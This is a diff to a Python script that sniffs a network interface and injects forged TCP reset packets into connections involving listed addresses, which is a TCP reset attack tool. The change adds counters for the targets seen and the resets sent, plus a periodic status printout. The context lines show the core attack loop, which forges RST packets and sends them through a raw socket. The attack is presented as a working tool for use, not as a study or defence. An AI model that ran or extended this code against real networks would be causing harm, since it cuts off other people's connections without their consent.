@@ -14,11 +14,18 @@ if len(argv) < 3:
     print("Usage: {} <iface> <addresses> ...", argv[0])
     exit(1)
 
+# listen on iface, only attack addresses in addresses
 iface, *addresses = argv[1:]
 
 attack_event = threading.Event()
 attack_targets = []
 attack_targets_lock = threading.Lock()
+
+stats = {
+    "attacks": 0,
+    "seen": []
+}
+stats_lock = threading.Lock()
 
 we_are = {"done here": False}
 
@@ -45,15 +52,23 @@ def listen():
         ip = frame.payload
         tcp = ip.payload
 
-        # ignore reset and final packets
+        # ignore RST and FIN packets
         if tcp.RST or tcp.FIN:
             continue
 
         sender = str(ip.source_address)
         receiver = str(ip.dest_address)
 
-        if sender not in addresses and receiver not in addresses:
-            continue
+        # combined blacklist check and stats
+        with stats_lock:
+            if sender in addresses:
+                if sender not in stats["seen"]:
+                    stats["seen"].append(sender)
+            elif receiver in addresses:
+                if receiver not in stats["seen"]:
+                    stats["seen"].append(receiver)
+            else:
+                continue
 
         with attack_targets_lock:
             attack_targets.append(frame)
@@ -91,6 +106,9 @@ def attack():
             target.payload.payload.forge_reset()
             attack_socket.send(target.raw())
 
+            with stats_lock:
+                stats["attacks"] += 1
+
         attack_event.clear()
 
     attack_socket.close()
@@ -104,5 +122,11 @@ attack_thread.start()
 try:
     while True:
         sleep(30)
+        with stats_lock:
+            print("Seen {}/{} targets. {} attacks.".format(
+                len(stats["seen"]),
+                len(addresses),
+                stats["attacks"]
+            ))
 except KeyboardInterrupt:
     we_are["done here"] = True
